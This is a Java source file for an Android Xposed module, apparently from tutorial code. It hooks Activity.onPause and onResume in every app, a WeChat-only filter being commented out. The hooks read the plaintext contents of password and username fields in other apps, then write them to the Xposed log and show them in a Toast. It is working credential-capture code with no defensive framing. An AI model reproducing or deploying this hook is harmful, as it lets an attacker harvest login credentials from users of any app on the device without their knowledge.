package de.robv.android.xposed.mods.tutorial;

import android.app.Activity;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;

public class XposedOnPause implements IXposedHookLoadPackage {

	@Override
	public void handleLoadPackage(LoadPackageParam lpparam) throws Throwable {
//		if (!lpparam.packageName.equals("com.tencent.mm"))
//            return;
		
		XposedHelpers.findAndHookMethod("android.app.Activity",
				lpparam.classLoader, "onPause",
				new XC_MethodHook() {

					@Override
					protected void beforeHookedMethod(MethodHookParam param)
							throws Throwable {
					}

					@Override
					protected void afterHookedMethod(MethodHookParam param)
							throws Throwable {
						XposedBridge.log("Enter->afterHookedMethod:Activity.onPause");
						Activity activity = (Activity) param.thisObject;
						if (XposedPassword.passwordID != 0) {
							View view = activity.findViewById(XposedPassword.passwordID);
							if(view instanceof EditText && ((EditText) view).getInputType() == 129) {
								XposedBridge.log("password input type: "+ ((EditText) view).getInputType());
								XposedBridge.log("password is: "+ ((EditText) view).getText().toString());
								Toast.makeText(activity, "password is: "+ ((EditText) view).getText().toString(), Toast.LENGTH_LONG).show();
							}
						}
						if(XposedPassword.usernameID != 0) {
							View view = activity.findViewById(XposedPassword.usernameID);
							if(view instanceof EditText) {
								XposedBridge.log("username input type: "+ ((EditText) view).getInputType());
								XposedBridge.log("username is: "+ ((EditText) view).getText().toString());
								Toast.makeText(activity, "username is: "+ ((EditText) view).getText().toString(), Toast.LENGTH_LONG).show();
							}
						}
					}
				});
		
		XposedHelpers.findAndHookMethod("android.app.Activity",
				lpparam.classLoader, "onResume",
				new XC_MethodHook() {

					@Override
					protected void beforeHookedMethod(MethodHookParam param)
							throws Throwable {
						XposedBridge.log("Enter->afterHookedMethod:Activity.onResume");
						Activity activity = (Activity) param.thisObject;
						if (XposedPassword.passwordID != 0) {
							View view = activity.findViewById(XposedPassword.passwordID);
							if(view instanceof EditText && ((EditText) view).getInputType() == 129) {
								XposedBridge.log("password input type: "+ ((EditText) view).getInputType());
								XposedBridge.log("password is: "+ ((EditText) view).getText().toString());
								Toast.makeText(activity, "password is: "+ ((EditText) view).getText().toString(), Toast.LENGTH_LONG).show();
							}
						}
						if(XposedPassword.usernameID != 0) {
							View view = activity.findViewById(XposedPassword.usernameID);
							if(view instanceof EditText) {
								XposedBridge.log("username input type: "+ ((EditText) view).getInputType());
								XposedBridge.log("username is: "+ ((EditText) view).getText().toString());
								Toast.makeText(activity, "username is: "+ ((EditText) view).getText().toString(), Toast.LENGTH_LONG).show();
							}
						}
					}

					@Override
					protected void afterHookedMethod(MethodHookParam param)
							throws Throwable {
					}
				});
	}

}
